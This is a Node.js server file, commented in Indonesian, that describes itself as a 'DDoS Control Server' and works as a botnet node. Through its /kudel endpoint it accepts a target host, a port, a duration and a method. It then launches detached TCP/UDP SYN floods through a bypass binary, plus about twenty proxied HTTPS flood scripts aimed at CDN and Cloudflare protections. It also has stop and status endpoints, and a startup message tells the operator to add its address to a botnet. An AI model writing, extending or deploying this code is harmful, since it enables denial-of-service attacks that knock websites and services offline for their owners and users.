const express = require('express');
const { exec, spawn, execFile } = require('child_process');
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const os = require('os');
const net = require('net');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

// Menyimpan proses serangan yang sedang berjalan
const activeAttacks = new Map();
const attackStatistics = new Map();

// Binary execution subsystem yang sederhana
class AttackExecutor {
    constructor() {
        this.binaryPath = './lib/cache/bypass'; // Langsung pakai ./bypass
        this.checkBinary();
    }

    checkBinary() {
        console.log('Checking bypass binary...');
        
        if (fs.existsSync(this.binaryPath)) {
            console.log(`✓ Bypass binary found at: ${path.resolve(this.binaryPath)}`);
            
            // Set execute permission jika di Unix/Linux
            if (process.platform !== 'win32') {
                try {
                    fs.chmodSync(this.binaryPath, 0o755);
                    console.log('✓ Execute permissions set');
                } catch (error) {
                    console.warn(`⚠ Could not set execute permissions: ${error.message}`);
                }
            }
        } else {
            console.error(`✗ Bypass binary not found at: ${path.resolve(this.binaryPath)}`);
            console.log('⚠ Please ensure bypass binary is in the same directory as this script');
        }
    }

    executeTCPAttack(host, port, attackTime, attackKey, targetInfo) {
        if (!fs.existsSync(this.binaryPath)) {
            console.error(`✗ Cannot execute attack: bypass binary not found`);
            return null;
        }

        try {
            // Parameter untuk TCP: ./bypass tcp ip port threads pps time syn
            const threads = 1; // Default threads
            const pps = 1024; // Default packets per second
            const synType = 'syn'; // Default SYN type (supporting syn,synack,ack,pshack)
            
            const args = ['tcp', host, port.toString(), threads.toString(), pps.toString(), attackTime.toString(), synType];
            
            console.log(`🚀 Executing TCP attack: ${this.binaryPath} ${args.join(' ')}`);
            
            const childProcess = spawn(this.binaryPath, args, {
                detached: true,
                stdio: ['ignore', 'pipe', 'pipe']
            });

            // Track process output for debugging
            childProcess.stdout.on('data', (data) => {
                console.log(`[TCP stdout]: ${data.toString().trim()}`);
            });

            childProcess.stderr.on('data', (data) => {
                console.error(`[TCP stderr]: ${data.toString().trim()}`);
            });

            childProcess.on('error', (error) => {
                console.error(`✗ Error executing TCP attack:`, error.message);
                if (activeAttacks.has(attackKey)) {
                    activeAttacks.delete(attackKey);
                }
                this.updateAttackStatus(attackKey, 'failed', error.message);
            });

            childProcess.on('exit', (code, signal) => {
                console.log(`[TCP] Process exited with code ${code}, signal ${signal}`);
                if (activeAttacks.has(attackKey)) {
                    activeAttacks.delete(attackKey);
                }
                const status = code === 0 ? 'completed' : 'failed';
                this.updateAttackStatus(attackKey, status, `Exit code: ${code}`);
            });

            childProcess.on('close', (code) => {
                console.log(`[TCP] Process closed with code ${code}`);
            });

            // Store process information
            activeAttacks.set(attackKey, {
                process: childProcess,
                type: 'tcp',
                binary: this.binaryPath,
                args: args,
                startTime: Date.now(),
                target: targetInfo
            });

            this.updateAttackStatus(attackKey, 'running', 'TCP attack started');

            childProcess.unref();
            return childProcess;

        } catch (error) {
            console.error(`✗ Failed to spawn TCP attack:`, error.message);
            this.updateAttackStatus(attackKey, 'failed', error.message);
            return null;
        }
    }

    executeUDPAttack(host, port, attackTime, attackKey, targetInfo) {
        if (!fs.existsSync(this.binaryPath)) {
            console.error(`✗ Cannot execute attack: bypass binary not found`);
            return null;
        }

        try {
            // Parameter untuk UDP: ./bypass udp ip port threads pps time
            const threads = 1; // Default threads
            const pps = 1024; // Default packets per second
            
            const args = ['udp', host, port.toString(), threads.toString(), pps.toString(), attackTime.toString()];
            
            console.log(`🚀 Executing UDP attack: ${this.binaryPath} ${args.join(' ')}`);
            
            const childProcess = spawn(this.binaryPath, args, {
                detached: true,
                stdio: ['ignore', 'pipe', 'pipe']
            });

            // Track process output for debugging
            childProcess.stdout.on('data', (data) => {
                console.log(`[UDP stdout]: ${data.toString().trim()}`);
            });

            childProcess.stderr.on('data', (data) => {
                console.error(`[UDP stderr]: ${data.toString().trim()}`);
            });

            childProcess.on('error', (error) => {
                console.error(`✗ Error executing UDP attack:`, error.message);
                if (activeAttacks.has(attackKey)) {
                    activeAttacks.delete(attackKey);
                }
                this.updateAttackStatus(attackKey, 'failed', error.message);
            });

            childProcess.on('exit', (code, signal) => {
                console.log(`[UDP] Process exited with code ${code}, signal ${signal}`);
                if (activeAttacks.has(attackKey)) {
                    activeAttacks.delete(attackKey);
                }
                const status = code === 0 ? 'completed' : 'failed';
                this.updateAttackStatus(attackKey, status, `Exit code: ${code}`);
            });

            // Store process information
            activeAttacks.set(attackKey, {
                process: childProcess,
                type: 'udp',
                binary: this.binaryPath,
                args: args,
                startTime: Date.now(),
                target: targetInfo
            });

            this.updateAttackStatus(attackKey, 'running', 'UDP attack started');

            childProcess.unref();
            return childProcess;

        } catch (error) {
            console.error(`✗ Failed to spawn UDP attack:`, error.message);
            this.updateAttackStatus(attackKey, 'failed', error.message);
            return null;
        }
    }

    updateAttackStatus(attackKey, status, message = '') {
        if (attackStatistics.has(attackKey)) {
            const stats = attackStatistics.get(attackKey);
            stats.status = status;
            stats.endTime = status !== 'running' ? Date.now() : undefined;
            stats.message = message;
            if (stats.endTime && stats.startTime) {
                stats.actualDuration = stats.endTime - stats.startTime;
            }
        }
    }
}

// Initialize attack executor
const attackExecutor = new AttackExecutor();

// Attack statistics tracker
class AttackStatistics {
    static trackAttack(attackKey, method, target, port, plannedDuration) {
        const stats = {
            startTime: Date.now(),
            method: method,
            target: target,
            port: port,
            plannedDuration: parseInt(plannedDuration) * 1000, // Convert to ms
            status: 'running',
            actualDuration: null,
            endTime: null,
            message: ''
        };
        attackStatistics.set(attackKey, stats);
        return stats;
    }

    static completeAttack(attackKey, status = 'completed', message = '') {
        if (attackStatistics.has(attackKey)) {
            const stats = attackStatistics.get(attackKey);
            stats.status = status;
            stats.endTime = Date.now();
            stats.actualDuration = stats.endTime - stats.startTime;
            stats.message = message;
        }
    }

    static getStats() {
        return Array.from(attackStatistics.entries());
    }

    static getActiveAttacks() {
        return Array.from(attackStatistics.entries())
            .filter(([key, stats]) => stats.status === 'running');
    }
}

// Fungsi untuk mengambil data dari API
async function fetchData() {
    try {
        const response = await axios.get('https://httpbin.org/get', {
            timeout: 10000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        const data = response.data;
        const serverUrl = `http://${data.origin}:${port}`;
        console.log(`🌐 Copy This Add To Botnet -> ${serverUrl}`);
        console.log(`🔗 API Endpoint: ${serverUrl}/kudel`);
        console.log(`⏹️ Stop Endpoint: ${serverUrl}/stop`);
        return data;
    } catch (error) {
        console.error('❌ Error fetching data:', error.message);
        // Fallback to local IP detection
        try {
            const interfaces = os.networkInterfaces();
            let localIp = 'localhost';
            
            Object.keys(interfaces).forEach(iface => {
                interfaces[iface].forEach(addr => {
                    if (addr.family === 'IPv4' && !addr.internal) {
                        localIp = addr.address;
                    }
                });
            });
            
            const serverUrl = `http://${localIp}:${port}`;
            console.log(`🌐 Local Server URL -> ${serverUrl}`);
            console.log(`🔗 API Endpoint: ${serverUrl}/kudel`);
            console.log(`⏹️ Stop Endpoint: ${serverUrl}/stop`);
            
            return { origin: localIp };
        } catch (fallbackError) {
            console.error('❌ Fallback IP detection failed:', fallbackError.message);
            return { origin: 'localhost' };
        }
    }
}

// Middleware untuk logging
app.use((req, res, next) => {
    console.log(`📨 ${new Date().toISOString()} ${req.method} ${req.url} from ${req.ip}`);
    next();
});

// Endpoint untuk menerima request serangan
app.get('/kudel', (req, res) => {
    const { host, port: targetPort, time, methods } = req.query;

    // Validasi parameter
    if (!host || !targetPort || !time || !methods) {
        return res.status(400).json({
            success: false,
            error: 'Missing required parameters: host, port, time, methods',
            example: '/kudel?host=example.com&port=80&time=60&methods=tcp'
        });
    }

    // Validasi waktu serangan (max 3600 detik = 1 jam)
    const attackTime = Math.min(parseInt(time), 3600);
    if (attackTime <= 0) {
        return res.status(400).json({
            success: false,
            error: 'Invalid time parameter. Must be positive number up to 3600 seconds'
        });
    }

    // Validasi port target
    const portNum = parseInt(targetPort);
    if (portNum < 1 || portNum > 65535) {
        return res.status(400).json({
            success: false,
            error: 'Invalid port number. Must be between 1 and 65535'
        });
    }

    // Respon ke client
    res.status(200).json({
        success: true,
        message: 'API request received. Executing attack shortly.',
        target: host,
        port: portNum,
        time: attackTime,
        methods: methods,
        attack_id: `${host}:${portNum}-${methods}-${Date.now()}`
    });

    console.log(`🎯 Received attack request: Method ${methods}, Target ${host}:${portNum}, Duration ${attackTime}s`);

    // Daftar metode serangan
    const attackMethods = {
        'https-cdn': `node ./lib/cache/https-cdn.js GET ${host} ${attackTime} 1 90 proxy.txt --cdn true --full --legit --randrate true`,
        'https-bypass': `node ./lib/cache/https-bypass.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-tlsv3': `node ./lib/cache/https-tlsv3.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-tlsv2': `node ./lib/cache/https-tlsv2.js ${host} ${attackTime} 90 1 proxy.txt`,
        
        // Binary attacks dengan bypass
        'tcp': 'tcp',
        'udp': 'udp',
        
        'https-raw': `node ./lib/cache/https-raw.js ${host} ${attackTime} 90 1 proxy.txt flood`,
        'https-flood': `node ./lib/cache/https-flood.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-browser': `node ./lib/cache/browser.js ${host} ${attackTime}`,
        'https-403': `node ./lib/cache/https-403.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-leak': `node ./lib/cache/https-leak.js GET "${host}" ${attackTime} 1 90 proxy.txt --randpath 1 --debug --cache --cookie "uh=good" --delay 1 --referer rand --postdata "user=f&pass=%RAND%" --authorization Bearer:abc123 --randrate --full --fakebot true --auth`,
        'https-cf': `node ./lib/cache/https-cf.js ${host} ${attackTime} 90 1 proxy.txt --all--bypass --all--full --all--extra --all-redirect --all-fingerprint --all-npath`,
        'https-tls': `node ./lib/cache/https-tls.js ${host} ${attackTime} 1 proxy.txt 90 false`,   
        'https-cve': `node ./lib/cache/https-cve.js GET "${host}" ${attackTime} 1 90 proxy.txt -query 1 --debug --limit true`,
        'https-flooder': `node ./lib/cache/https-flooder.js ${host} ${attackTime} 1 90 proxy.txt`,
        'https-killcf': `node ./lib/cache/https-killcf.js ${host} ${attackTime} 1 90 proxy.txt`,
        'https-spam': `node ./lib/cache/https-spam.js ${host} ${attackTime} 90 1`,
        'R2': `node ./lib/cache/R2.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-destroy': `node ./lib/cache/https-destroy.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-star': `node ./lib/cache/https-star.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-light': `node ./lib/cache/https-light.js ${host} ${attackTime} 90 1 proxy.txt`,
        'https-super': `node ./lib/cache/https-super.js ${host} ${attackTime} 1 90`
    };

    // Fungsi untuk mengeksekusi perintah
    const executeAttack = (methodConfig, attackKey, methodName) => {
        const targetInfo = { host, port: portNum, time: attackTime };
        
        if (typeof methodConfig === 'string') {
            // Cek jika ini metode TCP/UDP
            if (methodConfig === 'tcp') {
                return attackExecutor.executeTCPAttack(host, portNum, attackTime, attackKey, targetInfo);
            } else if (methodConfig === 'udp') {
                return attackExecutor.executeUDPAttack(host, portNum, attackTime, attackKey, targetInfo);
            } else {
                // Node.js script execution
                console.log(`🟢 Executing Node.js script: ${methodConfig}`);
                
                const [command, ...args] = methodConfig.split(' ');
                const childProcess = spawn(command, args, {
                    detached: true,
                    stdio: 'ignore'
                });
                
                activeAttacks.set(attackKey, {
                    process: childProcess,
                    type: 'nodejs',
                    script: methodConfig,
                    startTime: Date.now(),
                    target: targetInfo
                });
                
                AttackStatistics.trackAttack(attackKey, methodName, host, portNum, attackTime);
                
                childProcess.on('error', (error) => {
                    console.error(`❌ Error executing Node.js script:`, error.message);
                    activeAttacks.delete(attackKey);
                    AttackStatistics.completeAttack(attackKey, 'failed', error.message);
                });
                
                childProcess.on('exit', (code) => {
                    console.log(`📊 Node.js script exited with code ${code}`);
                    activeAttacks.delete(attackKey);
                    AttackStatistics.completeAttack(attackKey, code === 0 ? 'completed' : 'failed', `Exit code: ${code}`);
                });
                
                childProcess.unref();
                return childProcess;
            }
        }
    };

    // Generate unique attack key
    const baseAttackKey = `${host}:${portNum}-${methods}-${Date.now()}`;

    // Cek jika methods adalah mix (format: method1+method2+method3)
    if (methods.includes('+')) {
        const methodList = methods.split('+');
        
        // Batasi maksimal 5 metode
        const selectedMethods = methodList.slice(0, 5).map(method => ({
            name: method,
            config: attackMethods[method]
        })).filter(item => item.config !== undefined);
        
        if (selectedMethods.length > 0) {
            console.log(`🔀 Executing mix of ${selectedMethods.length} methods: ${selectedMethods.map(m => m.name).join(', ')}`);
            
            selectedMethods.forEach((method, index) => {
                const attackKey = `${baseAttackKey}-${index}`;
                AttackStatistics.trackAttack(attackKey, method.name, host, portNum, attackTime);
                executeAttack(method.config, attackKey, method.name);
            });
            
        } else {
            console.log('❌ No valid methods found in mix');
        }
    } else {
        // Eksekusi metode tunggal
        const selectedMethod = attackMethods[methods];
        if (selectedMethod) {
            AttackStatistics.trackAttack(baseAttackKey, methods, host, portNum, attackTime);
            executeAttack(selectedMethod, baseAttackKey, methods);
        } else {
            console.log(`❌ Unsupported method: ${methods}`);
            console.log(`📋 Supported methods: ${Object.keys(attackMethods).join(', ')}`);
        }
    }

    // Auto-cleanup setelah serangan selesai
    setTimeout(() => {
        if (activeAttacks.has(baseAttackKey)) {
            console.log(`🕒 Auto-cleaning attack ${baseAttackKey} after completion`);
            activeAttacks.delete(baseAttackKey);
        }
    }, attackTime * 1000 + 10000); // Waktu serangan + 10 detik buffer
});

// Endpoint untuk menghentikan serangan
app.get('/stop', (req, res) => {
    const { target, port, attack_id } = req.query;
    
    let stoppedCount = 0;
    let stoppedDetails = [];

    if (attack_id) {
        // Hentikan serangan spesifik berdasarkan ID
        if (activeAttacks.has(attack_id)) {
            try {
                const attack = activeAttacks.get(attack_id);
                attack.process.kill('SIGTERM');
                activeAttacks.delete(attack_id);
                AttackStatistics.completeAttack(attack_id, 'stopped', 'Manually stopped by API');
                stoppedCount++;
                stoppedDetails.push(attack_id);
                console.log(`⏹️ Stopped specific attack: ${attack_id}`);
            } catch (error) {
                console.error(`❌ Error stopping attack ${attack_id}:`, error.message);
            }
        }
        
        res.status(200).json({
            success: true,
            message: `Stopped ${stoppedCount} attacks for ID ${attack_id}`,
            stopped_attacks: stoppedDetails
        });
        
    } else if (target && port) {
        // Hentikan serangan spesifik berdasarkan target dan port
        for (const [key, attack] of activeAttacks.entries()) {
            if (key.includes(`${target}:${port}`)) {
                try {
                    attack.process.kill('SIGTERM');
                    activeAttacks.delete(key);
                    AttackStatistics.completeAttack(key, 'stopped', 'Manually stopped by API');
                    stoppedCount++;
                    stoppedDetails.push(key);
                    console.log(`⏹️ Stopped attack: ${key}`);
                } catch (error) {
                    console.error(`❌ Error stopping attack ${key}:`, error.message);
                }
            }
        }
        
        res.status(200).json({
            success: true,
            message: `Stopped ${stoppedCount} attacks for ${target}:${port}`,
            stopped_attacks: stoppedDetails
        });
    } else {
        // Hentikan semua serangan
        for (const [key, attack] of activeAttacks.entries()) {
            try {
                attack.process.kill('SIGTERM');
                activeAttacks.delete(key);
                AttackStatistics.completeAttack(key, 'stopped', 'Manually stopped by API');
                stoppedCount++;
                stoppedDetails.push(key);
                console.log(`⏹️ Stopped attack: ${key}`);
            } catch (error) {
                console.error(`❌ Error stopping attack ${key}:`, error.message);
            }
        }
        
        res.status(200).json({
            success: true,
            message: `Stopped all ${stoppedCount} attacks`,
            stopped_attacks: stoppedDetails
        });
    }
});

// Endpoint untuk status server
app.get('/status', (req, res) => {
    const activeCount = activeAttacks.size;
    const totalStats = AttackStatistics.getStats().length;
    const activeStats = AttackStatistics.getActiveAttacks();
    
    res.status(200).json({
        server_status: 'running',
        port: port,
        uptime: process.uptime(),
        active_attacks: activeCount,
        total_attacks_processed: totalStats,
        currently_active: activeStats.map(([key, stats]) => ({
            attack_id: key,
            method: stats.method,
            target: `${stats.target}:${stats.port}`,
            duration: `${Math.round((Date.now() - stats.startTime) / 1000)}s/${Math.round(stats.plannedDuration / 1000)}s`,
            status: stats.status
        })),
        memory_usage: process.memoryUsage()
    });
});

// Endpoint untuk info binary
app.get('/binaries', (req, res) => {
    const binaryPath = attackExecutor.binaryPath;
    const binaryInfo = {
        bypass: {
            exists: fs.existsSync(binaryPath),
            path: path.resolve(binaryPath),
            executable: fs.existsSync(binaryPath) ? 
                (process.platform !== 'win32' ? 
                    !!(fs.statSync(binaryPath).mode & fs.constants.S_IXUSR) : 
                    true) : 
                false
        }
    };
    
    res.json({
        platform: process.platform,
        architecture: process.arch,
        binary_info: binaryInfo
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        server: 'DDoS Control Server',
        version: '1.0.0'
    });
});

// Handle 404
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: 'Endpoint not found',
        available_endpoints: {
            attack: 'GET /kudel?host=target.com&port=80&time=60&methods=tcp',
            stop: 'GET /stop?target=host&port=80 OR /stop?attack_id=id',
            status: 'GET /status',
            binaries: 'GET /binaries',
            health: 'GET /health'
        }
    });
});

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('💥 Server error:', error);
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        message: error.message
    });
});

// Graceful shutdown handling
process.on('SIGINT', () => {
    console.log('\n🛑 Received SIGINT. Shutting down gracefully...');
    
    // Stop all active attacks
    let stoppedCount = 0;
    for (const [key, attack] of activeAttacks.entries()) {
        try {
            attack.process.kill('SIGTERM');
            stoppedCount++;
        } catch (error) {
            console.error(`Error stopping attack ${key}:`, error.message);
        }
    }
    
    console.log(`⏹️ Stopped ${stoppedCount} active attacks`);
    console.log('👋 Server shutdown complete');
    process.exit(0);
});

// Jalankan server
app.listen(port, () => {
    console.log(`🚀 Server running on port ${port}`);
    console.log(`📍 Local URL: http://localhost:${port}`);
    console.log(`📊 Status endpoint: http://localhost:${port}/status`);
    console.log(`🛑 Stop endpoint: http://localhost:${port}/stop`);
    console.log('🔧 Checking bypass binary...');
    
    // Initial system check
    setTimeout(() => {
        fetchData();
        console.log('✅ Server initialization complete');
        console.log('💡 Use /kudel endpoint to start attacks');
        console.log('💡 Use /binaries endpoint to check binary status');
    }, 1000);
});

// Export untuk testing
module.exports = { app, attackExecutor, activeAttacks, attackStatistics };